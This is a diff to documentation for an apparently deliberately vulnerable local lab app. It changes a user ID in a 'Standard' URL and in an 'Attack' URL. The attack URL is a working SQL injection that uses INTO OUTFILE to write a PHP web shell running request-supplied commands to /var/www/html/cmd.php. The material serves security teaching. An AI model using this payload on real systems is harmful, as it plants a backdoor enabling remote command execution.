@@ -76,13 +76,13 @@ Using LAMP Server:
 
 ### Standard
 
-[http://127.0.0.1:8782/into_outfile/list_users.php?UserID=1](http://127.0.0.1:8782/into_outfile/list_users.php?UserID=1)
+[http://127.0.0.1:8782/into_outfile/list_users.php?UserID=2](http://127.0.0.1:8782/into_outfile/list_users.php?UserID=2)
 
 ### Attack
 
 Use `INTO OUTFILE`:
 
-http://127.0.0.1:8782/into_outfile/list_users.php?UserID=1%20UNION%20SELECT%201,2,%27%3C?php%20system($_REQUEST[%22cmd%22]);%20?%3E%27%20INTO%20OUTFILE%20%27/var/www/html/cmd.php%27
+http://127.0.0.1:8782/into_outfile/list_users.php?UserID=2%20UNION%20SELECT%201,2,%27%3C?php%20system($_REQUEST[%22cmd%22]);%20?%3E%27%20INTO%20OUTFILE%20%27/var/www/html/cmd.php%27
 
 `/var/www/html/cmd.php` should not exist before.
 
